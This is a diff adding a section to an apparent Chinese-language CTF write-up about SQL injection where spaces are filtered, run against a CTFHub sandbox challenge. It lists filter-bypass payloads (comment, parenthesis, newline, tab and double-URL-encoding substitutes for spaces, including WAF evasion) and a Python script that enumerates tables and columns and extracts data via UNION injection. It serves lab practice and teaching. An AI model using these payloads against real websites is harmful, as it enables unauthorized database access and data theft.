@@ -519,3 +519,38 @@ requests.get(url, headers=headers, timeout=1).text
   ```
   
   第三种可以用sqlmap，不过我还不会用，下次试试
+
+  - #### 过滤空格
+
+  sql注入经常需要用到空格，那么服务器可以把空格进行过滤（删除or替换）。若Web应用对用户输入中的**空格进行过滤**（如删除或替换），攻击者可能无法直接构造完整的恶意SQL语句，从而阻碍注入攻击。然而，攻击者常会通过**替代空格**的方式绕过过滤，因此防御需结合多种手段。
+
+  **攻击者如何绕过空格过滤？**
+
+  - 注释符：`/**/`：`UNION/**/SELECT/**/1,2,3--`
+  - 括号：`()`、`UNION(SELECT(1),(2),(3))--`
+  - 换行符：`%0A`、`UNION%0ASELECT%0A1,2,3--`
+  - Tab符：`%09`、`UNION%09SELECT%091,2,3--`
+  - 双重URL编码：`%2520`（绕过WAF的单层url解码）
+
+  现在来解题目![image-20250225220902195](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20250225220902195.png)
+
+​		可以发现，现在的sql注入直接在http的url，那么又是过滤空格，所以可以采取几种办法进行注入。首先，可以用注释符，但是需要注意的是，用注释符，需要对sql代码进行编码，才能够传入，可以用`from urllib.parse import quote`python的url编码，代码如下：
+
+```python
+import requests
+from urllib.parse import quote
+# id = "1 and 1=2 union select database(), 2"
+# id = "1 and 1=2 union select group_concat(table_name),2 from information_schema.tables where table_schema='sqli'"
+# id = "1 and 1=2 union select group_concat(column_name),2 from information_schema.columns where table_name='mdyojbhjuc'"
+id = "1 and 1=2 union select hdbropxang,2 from mdyojbhjuc"
+
+id = id.replace(' ', '/**/')
+print(id)
+
+burp0_url = "http://challenge-02e2810ce1fc187c.sandbox.ctfhub.com:10800/?id="
+burp0_headers = {"Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Referer": "http://challenge-02e2810ce1fc187c.sandbox.ctfhub.com:10800/?id=1", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8", "Connection": "keep-alive"}
+print(requests.get(burp0_url+quote(id), headers=burp0_headers).text)
+# print(requests.get(burp0_url+id, headers=burp0_headers).text)
+```
+
+但是如果直接将空格替换为已经编码好的换行符、Tab符，那么就不需要进行url编码。
